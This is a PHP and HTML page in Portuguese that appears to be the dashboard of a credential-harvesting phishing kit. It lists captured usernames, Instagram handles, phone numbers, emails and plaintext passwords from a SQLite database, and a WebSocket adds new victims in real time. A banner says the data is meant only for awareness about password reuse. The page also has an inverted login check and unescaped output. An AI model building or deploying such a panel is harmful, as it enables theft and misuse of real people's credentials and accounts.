<!DOCTYPE html>
<?php session_start();

function isAuth() {
    return !isset($_SESSION['user']);
}

if(isAuth()) {
    echo "Pagina restrita";
    header("Location: ../../");
    return;
}

?>
<html lang="pt-br">
    <head>
        <title></title>
        <link rel="stylesheet" href="../../css/svlogs/main.css">

        <script>
            let host = "ws://<?php echo $_SERVER['SERVER_ADDR'] ?>:8090";
        </script>
    </head>

    <body>
        <div class="svlogs-inner">
            <div class="top">
                <h1>
                    Usuarios Registrados
                </h1>
                <span style="margin-top: .5rem">
                    Os dados aqui so devem ser usados para fins de conscientização sobre o grande problema de colocar suas
                      credenciais em qualquer site pela internet, alem do grande problema em utilizar a mesma senha para varias
                      plataformas.
                </span>
            </div>
            <div class="data">
                <?php
                $db = new SQLite3('../../db/user.sqlite3');
                $query = "SELECT * FROM users";

                echo
                '<table id="live-data">
                    <tr>
                        <td>Usuario</td>
                        <td>Instagram</td>
                        <td>Telefone</td>
                        <td>Email</td>
                        <td>Senha</td>
                    </tr>
                ';

                $res = $db->query($query);
                while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
                    echo '<tr>';
                    echo '<td>' . $row['username'] . '</td>';
                    echo '<td>' . $row['instagram'] . '</td>';
                    echo '<td>' . $row['telefone'] . '</td>';
                    echo '<td>' . $row['email'] . '</td>';
                    echo '<td>' . $row['password'] . '</td>';
                    echo '</tr>';
                }

                echo '</table>';
                ?>
            </div>
        </div>

    <script>
        const socket = new WebSocket(host);
        const data_table = document.getElementById("live-data")
        /**
         * Objetos retornados:
         * username
         * instagram
         * telefone
         * email
         * password
         */
        socket.onmessage = function(e) {
            const data = JSON.parse(e.data);
            if (data.type === 'new-user') {

                const htmlText = `
                    <tr>
                        <td>${data.user.username}</td>
                        <td>${data.user.instagram}</td>
                        <td>${data.user.telefone}</td>
                        <td>${data.user.email}</td>
                        <td>${data.user.password}</td>
                    </tr>
                `;

                data_table.insertAdjacentHTML('beforeend', htmlText);
            }
        }
    </script>
    </body>
</html>